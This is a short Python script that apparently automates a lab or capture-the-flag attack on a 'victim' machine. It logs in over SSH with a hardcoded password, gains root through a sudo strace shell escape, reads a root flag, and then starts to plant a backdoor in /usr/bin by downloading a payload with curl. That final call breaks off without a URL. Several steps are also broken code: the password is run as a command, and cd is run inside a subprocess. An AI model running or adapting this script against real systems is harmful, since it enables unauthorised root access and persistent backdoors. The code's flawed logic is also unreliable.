# start_script.py
import subprocess, config

victim_ip = config.VICTIM_IP

def run_command(cmd, timeout=30):
    """Run a command and return (success, output)."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=True,
            timeout=timeout,
        )
        return True, result.stdout.strip()
    except subprocess.CalledProcessError as e:
        return False, e.stderr.strip()
    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        return False, str(e)

# ssh user@192.168.64.6
ok, output = run_command(["ssh", f"user@{victim_ip}"])
print(f"ssh connection made" if ok else "Failed", "->", output)

# enter password "hill"
ok, output = run_command(["hill"])
print(f"password accepted" if ok else "Failed", "->", output)

# sudo /bin/strace -o /dev/null /bin/bash -p 
# to gain root privileges, install backdoor, and execute payload
ok, output = run_command(["sudo", "/bin/strace", "-o", "/dev/null", "/bin/bash", "-p"])
print(f"root escalation ran" if ok else "Failed", "->", output)

# confirm root escalation succeeded
ok, output = run_command(["cat", "FLAG-root.txt"])
print(f"flag acquired" if ok else "Failed", "->", output)
if ok:
    if output != "week4rootZXJF:":
        print(f"root escalation failed. flag returned={output}")
    else:
        print(f"root escalation successfully verified.")
    
# move to directory where we will install backdoor
ok, output = run_command(["cd", "../../usr/bin"])
print(f"entered /usr/bin" if ok else "Failed", "->", output)

# curl -o myfile.txt https://raw.githubusercontent.com/USER/REPO/main/path/to/file.txt
ok, output = run_command(["curl", "-o", "zggrep.py", ])
